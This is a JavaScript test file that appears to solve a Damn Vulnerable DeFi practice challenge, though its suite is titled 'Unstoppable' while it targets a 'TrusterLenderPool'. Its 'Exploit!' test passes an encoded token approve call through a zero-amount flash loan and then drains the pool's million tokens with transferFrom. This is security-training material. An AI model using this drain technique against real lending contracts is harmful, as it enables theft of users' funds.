const { ether, expectRevert } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');
const { expect } = require('chai');

describe("[Challenge] Unstoppable", function () {
  // Ethereum balances
  const TOKENS_IN_POOL = 1000000;

  // Declare variables
  let ContractFactoryA;
  let ContractFactoryB;
  let token;
  let pool;
  let deployer;
  let attacker;
  let otherAccounts;

  beforeEach(async function () {
    //Setup accounts and contracts
    [deployer, attacker, ...otherAccounts] = await ethers.getSigners();
    ContractFactoryA = await ethers.getContractFactory("DamnValuableToken");
    ContractFactoryB = await ethers.getContractFactory("TrusterLenderPool");
    token = await ContractFactoryA.deploy();
    pool = await ContractFactoryB.deploy(token.address);
    await token.transfer(pool.address, TOKENS_IN_POOL);

  })

  it("Pool balance = 1000000 DVT", async function() {
    let bal = await token.balanceOf(pool.address);
    expect(bal).to.equal(1000000);
  })

  it("Attacker balance = 0 DVT", async function() {
    let bal = await token.balanceOf(attacker.address);
    expect(bal).to.equal(0);
  })

  it("Exploit!", async function() {
    //Insert exploit function here
    const abi = [
      "function approve(address spender, uint256 amount)"
    ];
    const iface = new ethers.utils.Interface(abi);
    const data = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);

    await pool.flashLoan(0, attacker.address, token.address, data);
    await token.connect(attacker).transferFrom(pool.address, attacker.address, TOKENS_IN_POOL);

    //Checks
    let bal0 = await token.balanceOf(pool.address);
    let bal1 = await token.balanceOf(attacker.address);
    expect(bal0).to.equal(0);
    expect(bal1).to.equal(1000000);
  })

})
